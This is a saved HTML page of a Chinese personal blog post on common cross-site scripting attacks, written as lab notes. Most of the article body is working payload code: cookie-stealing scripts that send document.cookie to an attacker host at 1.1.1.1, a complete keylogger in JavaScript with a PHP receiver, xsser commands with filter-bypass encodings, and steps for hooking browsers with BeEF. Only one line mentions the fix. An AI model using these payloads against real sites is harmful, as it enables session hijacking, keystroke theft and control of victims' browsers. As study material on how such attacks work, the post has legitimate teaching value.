@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+<!-- Google Analytics -->
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-112417276-1', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<!-- End Google Analytics -->
+
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    <title>XSS常用攻击手段 | Recall Hyx | Your star</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#FFC107">
+    
+    
+    <meta name="keywords" content="漏洞">
+    <meta name="description" content="XSS（cross-site scripting） 通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的注入客户端脚本代码，盗取cookie、重定向  使用场景12345直接嵌入html：&amp;lt;script&amp;gt; alert(&apos;xss);&amp;lt;/script&amp;gt;元素标签时间：&amp;lt;body onload=alert(&apos;xss&apos;)&amp;gt;图片标签：&amp;lt;img src=">
+<meta name="keywords" content="漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS常用攻击手段">
+<meta property="og:url" content="https://recallhyx.github.io/2018/01/31/XSS常用攻击手段/index.html">
+<meta property="og:site_name" content="Recall Hyx">
+<meta property="og:description" content="XSS（cross-site scripting） 通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的注入客户端脚本代码，盗取cookie、重定向  使用场景12345直接嵌入html：&amp;lt;script&amp;gt; alert(&apos;xss);&amp;lt;/script&amp;gt;元素标签时间：&amp;lt;body onload=alert(&apos;xss&apos;)&amp;gt;图片标签：&amp;lt;img src=">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5834506-371c5fff4a97bb4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5834506-4e42465a9340d6bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5834506-0df4a67ed2e19f9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5834506-974e501753a737bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5834506-c61c42f5e0acc2e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5834506-407ea68464fc3a9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5834506-971e33a1751fc483.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5834506-c21b84a808833622.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5834506-f59f32a3770ef2c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5834506-567e1f0e78f8a2d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-09-13T13:53:36.231Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS常用攻击手段">
+<meta name="twitter:description" content="XSS（cross-site scripting） 通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的注入客户端脚本代码，盗取cookie、重定向  使用场景12345直接嵌入html：&amp;lt;script&amp;gt; alert(&apos;xss);&amp;lt;/script&amp;gt;元素标签时间：&amp;lt;body onload=alert(&apos;xss&apos;)&amp;gt;图片标签：&amp;lt;img src=">
+<meta name="twitter:image" content="http://upload-images.jianshu.io/upload_images/5834506-371c5fff4a97bb4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Recall HYX</h5>
+          <a href="mailto:quce.hu@qq.com" title="quce.hu@qq.com" class="mail">quce.hu@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                文章
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/recallhyx" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">XSS常用攻击手段</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">XSS常用攻击手段</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2018-01-31T06:48:21.000Z" itemprop="datePublished" class="page-time">
+  2018-01-31
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XSS（cross-site-scripting）"><span class="post-toc-number">1.</span> <span class="post-toc-text">XSS（cross-site scripting）</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#反射型漏洞注入："><span class="post-toc-number">2.</span> <span class="post-toc-text">反射型漏洞注入：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Xsser–自动化工具"><span class="post-toc-number">3.</span> <span class="post-toc-text">Xsser–自动化工具</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#存储型XSS"><span class="post-toc-number">4.</span> <span class="post-toc-text">存储型XSS</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#DOM型XSS"><span class="post-toc-number">5.</span> <span class="post-toc-text">DOM型XSS</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#BEEF攻击框架"><span class="post-toc-number">6.</span> <span class="post-toc-text">BEEF攻击框架</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-XSS常用攻击手段"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">XSS常用攻击手段</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-01-31 14:48:21" datetime="2018-01-31T06:48:21.000Z"  itemprop="datePublished">2018-01-31</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+
+
+            
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="XSS（cross-site-scripting）"><a href="#XSS（cross-site-scripting）" class="headerlink" title="XSS（cross-site scripting）"></a>XSS（cross-site scripting）</h2><blockquote>
+<p>通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的<br>注入客户端脚本代码，盗取cookie、重定向</p>
+</blockquote>
+<p><strong>使用场景</strong><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">直接嵌入html：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> alert('xss);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">元素标签时间：<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br><span class="line">图片标签：<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"javascript:alert('xss);"</span>&gt;</span></span><br><span class="line">其他标签：<span class="tag">&lt;<span class="name">iframe</span>&gt;</span>，<span class="tag">&lt;<span class="name">div</span>&gt;</span>，<span class="tag">&lt;<span class="name">link</span>&gt;</span></span><br><span class="line">DOM对象，篡改页面内容</span><br></pre></td></tr></table></figure></p>
+<p><strong>漏洞形成的根源：</strong></p>
+<ul>
+<li>服务器对用户提交数据过滤不严</li>
+<li>提交给服务器的脚本被直接返回给其他客户端执行</li>
+<li>脚本在客户端执行恶意操作</li>
+</ul>
+<p><strong>XSS漏洞类型：</strong></p>
+<ul>
+<li>存储型（持久型）</li>
+<li>反射型（非持久）</li>
+<li>DOM 型</li>
+</ul>
+<p><strong>怎么知道网站是否有漏洞：</strong><br>提交的数据原封不动的返回  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/5834506-371c5fff4a97bb4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="提交表单前"><br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://upload-images.jianshu.io/upload_images/5834506-4e42465a9340d6bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="提交表单后" title="">
+                </div>
+                <div class="image-caption">提交表单后</div>
+            </figure></p>
+<h2 id="反射型漏洞注入："><a href="#反射型漏洞注入：" class="headerlink" title="反射型漏洞注入："></a><strong>反射型漏洞注入：</strong></h2><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'xss'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">''</span> <span class="attr">onlick</span>=<span class="string">alert(</span>'<span class="attr">xss</span>');&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://192.168.1.1/a.jpg</span> <span class="attr">onerror</span>=<span class="string">alert(</span>'<span class="attr">xss</span>');&lt;/<span class="attr">script</span>&gt;</span>（当图片找不到就会执行onerror）</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location=<span class="string">'http://192.168.1.1'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>（页面重定向）</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.1.1/victim"</span> <span class="attr">height</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">"http://1.1.1.1/c.php?output="</span>+<span class="built_in">document</span>.cookie;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml">（将cookie发送到自己的主机）</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">document.body.innerHTML="<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">visibility:visible;</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>HELLO<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>;"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://1.1.1.1/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">a.js: var img = new Image();img.src="http://1.1.1.1/cookie.php?cookie="+document.cookie</span></span><br><span class="line"><span class="xml">（让浏览器去包含一个有木马的js文件，这样有隐蔽性）</span></span><br></pre></td></tr></table></figure>
+<p><strong>反射型漏洞例子：键盘记录器</strong><br>原理：在被攻击者的电脑浏览器上调用指定ip地址上的js文件，即利用XSS输入以下脚本<br><code>&lt;script src=&quot;http://1.1.1.1/keylogger.js&quot;&gt;&lt;/script&gt;</code>  </p>
+<p>在<code>/var/www/html/</code>目录下新建<code>keylogger.js</code></p>
+<p>keylogger.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">  evt = evt || <span class="built_in">window</span>.event;</span><br><span class="line">  key = <span class="built_in">String</span>.fromCharCode(evt.charCode)</span><br><span class="line">  <span class="keyword">if</span>(key) &#123;</span><br><span class="line">    <span class="keyword">var</span> http = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    <span class="keyword">var</span> param = <span class="built_in">encodeURI</span>(key);</span><br><span class="line">    http.open(<span class="string">"POST"</span>,<span class="string">"http://1.1.1.1/keylogger.php"</span>,<span class="literal">true</span>);<span class="comment">//注意：把ip地址改成自己的ip</span></span><br><span class="line">    http.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">    http.send(<span class="string">"key="</span>+param);  </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>由于我们是由<code>keylogger.php</code>文件接收键盘记录的，所以还需要一个php脚本</p>
+<p>keylogger.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $key = $_POST[<span class="string">'key'</span>];</span><br><span class="line">    $logfile = <span class="string">"keylog.txt"</span>;</span><br><span class="line">    $fp = fopen($logfile,<span class="string">"a"</span>);</span><br><span class="line">    fwrite($fp,$key);</span><br><span class="line">    fclose($fp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后新建一个<code>keylog.txt</code>，用来记录被攻击者的键盘记录，改写它的权限<code>chmod 777 keylog.txt</code><br>然后执行<code>service apache2 start</code>开启apache，可以用<code>netstat -pantu | grep :80</code>查看被占用的进程然后杀掉<br>确保能够访问到刚才写的js脚本  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/5834506-0df4a67ed2e19f9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>最后就可以在有XSS漏洞的地方输入<code>&lt;script src=&quot;http://1.1.1.1/keylogger.js&quot;&gt;&lt;/script&gt;</code>注入脚本  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/5834506-974e501753a737bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>提交之后，可以看到url地址已经变了，而且被攻击者也有提示输入成功，这个时候我们就可以敲键盘，没有焦点也可以记录键盘，这里为了显示方便，我们在输入框输入<code>hello hacker</code>  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/5834506-c61c42f5e0acc2e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="被攻击者用键盘输入">  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/5834506-407ea68464fc3a9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="攻击者的keylog文件"></p>
+<h2 id="Xsser–自动化工具"><a href="#Xsser–自动化工具" class="headerlink" title="Xsser–自动化工具"></a>Xsser–自动化工具</h2><ul>
+<li>图形化/命令行界面（图形化只需要在命令行输入<code>xsser --gtk</code>）</li>
+<li>绕过服务器端输入筛选<br>10进制/16进制<br>unescape()</li>
+<li>xsser -u “<a href="http://172.16.242.128/dvwa/vulnerabilities/&quot;" target="_blank" rel="noopener">http://172.16.242.128/dvwa/vulnerabilities/&quot;</a> -g “xss_r/?name=” –cookie=”security=low; PHPSESSID=1f7c245b5c6145fbeb0f36d5e601ef2f” -s -v –reverse-check</li>
+</ul>
+<p>参数<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">g（Get方法） -p （Post方法）</span></span><br><span class="line"><span class="ruby">-s （在结束后显示统计信息）</span></span><br><span class="line"><span class="ruby">-v （显示详细信息）</span></span><br><span class="line"><span class="ruby">--reverse-check （发送一个含有本机连接的js文件，基于连接是否被建立来判断时候有漏洞）</span></span><br><span class="line"><span class="ruby">--heuristic （检查被过滤的字符）</span></span><br></pre></td></tr></table></figure></p>
+<p>对payload编码，绕过服务器端筛选过滤<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">-Str               Use method String.FromCharCode()</span></span><br><span class="line"><span class="ruby">--Une               Use Unescape() function</span></span><br><span class="line"><span class="ruby">--Mix               Mix String.FromCharCode() <span class="keyword">and</span> Unescape()</span></span><br><span class="line"><span class="ruby">--Dec               Use Decimal encoding</span></span><br><span class="line"><span class="ruby">--Hex               Use Hexadecimal encoding</span></span><br><span class="line"><span class="ruby">--Hes               Use Hexadecimal encoding with semicolons</span></span><br><span class="line"><span class="ruby">--Dwo               Encode IP addresses with DWORD</span></span><br><span class="line"><span class="ruby">--Doo               Encode IP addresses with Octal</span></span><br><span class="line"><span class="ruby">--Cem=CEM           Set different <span class="string">'Character Encoding Mutations'</span></span></span><br><span class="line"><span class="ruby">                    (reversing obfuscators) (<span class="symbol">ex:</span> <span class="string">'Mix,Une,Str,Hex'</span>)</span></span><br></pre></td></tr></table></figure></p>
+<p>注入技术<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">-Coo               COO - Cross Site Scripting Cookie injection</span></span><br><span class="line"><span class="ruby">--Xsa               XSA - Cross Site Agent Scripting</span></span><br><span class="line"><span class="ruby">--Xsr               XSR - Cross Site Referer Scripting</span></span><br><span class="line"><span class="ruby">--Dcp               DCP - Data Control Protocol injections</span></span><br><span class="line"><span class="ruby">--Dom               DOM - Document Object Model injections</span></span><br><span class="line"><span class="ruby">--Ind               IND - HTTP Response Splitting Induced code</span></span><br><span class="line"><span class="ruby">--Anchor            ANC - Use Anchor Stealth payloader (DOM shadows!)</span></span><br></pre></td></tr></table></figure></p>
+<p>其他可以用的参数<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">--Fp</span>=FINALPAYLOAD   OWN    - Exploit your own code</span><br><span class="line"><span class="attribute">--Fr</span>=FINALREMOTE    REMOTE - Exploit a<span class="built_in"> script </span>-remotely-</span><br><span class="line">--Doss              DOSs   - XSS (server) Denial of Service</span><br><span class="line">--Dos               DOS    - XSS (client) Denial of Service</span><br><span class="line">--B64               B64    - Base64 code encoding <span class="keyword">in</span> META tag (rfc2397)</span><br><span class="line">--Onm               ONM - Use onMouseMove() event</span><br><span class="line">--Ifr               IFR - Use &lt;iframe&gt; source tag</span><br></pre></td></tr></table></figure></p>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><ul>
+<li>长期存储于服务器端</li>
+<li>每次用户访问都会被执行js脚本</li>
+</ul>
+<p>漏洞常见于有留言板之类功能的网站，因为评论或留言之后我们可以看到自己刚才输入的东西。这样，只要一次注入，其他人打开这个网站的时候，就会加载这个脚本，就可以盗取cookie或者记录键盘<br>有一些评论会限制字数，不能注入完整的脚本，但是我们可以用<code>burpsuite</code>截断代理，截断请求，然后在请求里面注入脚本，关于怎么使用<code>burpsuite</code>我在之前有发过一篇工具介绍，可以参考那篇文章</p>
+<p>对于XSS，需要对变量输入和变量输出做数据清洗（符号编码，去除一些字符），才能完全补上这个漏洞</p>
+<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>DOM ：一套js和其他语言可以调用的API<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://1.1.1.1:88/log?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="BEEF攻击框架"><a href="#BEEF攻击框架" class="headerlink" title="BEEF攻击框架"></a>BEEF攻击框架</h2><ul>
+<li>生成、交付payload</li>
+<li>ruby语言编写</li>
+<li>服务器端：管理hooked客户端</li>
+<li>客户端：运行于客户端浏览器的 js 脚本（hook）<br>浏览器攻击面：</li>
+<li>应用普遍转移到B/S架构，浏览器成为统一客户端程序</li>
+<li>结合社会工程学方法对浏览器进行攻击</li>
+<li>攻击浏览器用户</li>
+<li>通过注入的JS脚本，利用浏览器攻击其他网站<br>攻击手段：</li>
+<li>利用网站xss漏洞实现攻击，能利用存储型xss漏洞更好</li>
+<li>诱使客户端访问含有hook的伪造站点</li>
+<li>结合中间人攻击注入hook脚本<br>常见用途：</li>
+<li>键盘记录器</li>
+<li>网络扫描</li>
+<li>浏览器信息收集</li>
+<li>绑定shell</li>
+<li>与metasploit 集成<br>使用方式：<br>在kali2.0的左侧就有集成好的Beef，点击之后在终端可以看到提示，在浏览器中输入url就能进入到web管理页面，默认帐号和密码都是<code>beef</code>  </li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/5834506-971e33a1751fc483.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>在有xss漏洞的地方注入终端提示的代码，注意，要把ip地址改为beef启动的机器的ip地址<br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://upload-images.jianshu.io/upload_images/5834506-c21b84a808833622.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>   </p>
+<p>之后就能在 beef管理页面看到被hooked的网站  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/5834506-f59f32a3770ef2c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>hooked客户端做的一切操作都会记录在<code>log</code>标签<br><img src="http://upload-images.jianshu.io/upload_images/5834506-567e1f0e78f8a2d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>commands标签：</p>
+<ul>
+<li>绿色：表示模块适合目标浏览器，并且执行结果不被客户端可见</li>
+<li>红色：表示模块不适用于当前用户，有些红色模块也可以正常执行</li>
+<li>橙色：模块可用，但结果对用户可见（CAM弹窗申请权限等）</li>
+<li>灰色：模块未在目标浏览器上测试过</li>
+</ul>
+<p>这个标签包含很多模块，可以对hooked客户端进行各种攻击，包括打开摄像头，记录表单，甚至可以利用hooked的浏览器进行DDOS攻击，就是所谓的僵尸机，有很强的隐蔽性</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="https://recallhyx.github.io">
+            <img src="/img/avatar.jpg" alt="Recall HYX">
+            Recall HYX
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://recallhyx.github.io/2018/01/31/XSS常用攻击手段/&title=《XSS常用攻击手段》 — Recall Hyx&pic=https://recallhyx.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://recallhyx.github.io/2018/01/31/XSS常用攻击手段/&title=《XSS常用攻击手段》 — Recall Hyx&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://recallhyx.github.io/2018/01/31/XSS常用攻击手段/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《XSS常用攻击手段》 — Recall Hyx&url=https://recallhyx.github.io/2018/01/31/XSS常用攻击手段/&via=https://recallhyx.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://recallhyx.github.io/2018/01/31/XSS常用攻击手段/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2018/02/05/CSRF和WebShell/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">CSRF和WebShell</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2018/01/27/手动漏洞挖掘（二）/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">手动漏洞挖掘（二）</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Valine Comments -->
+    <div class="comments vcomment" id="comments"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
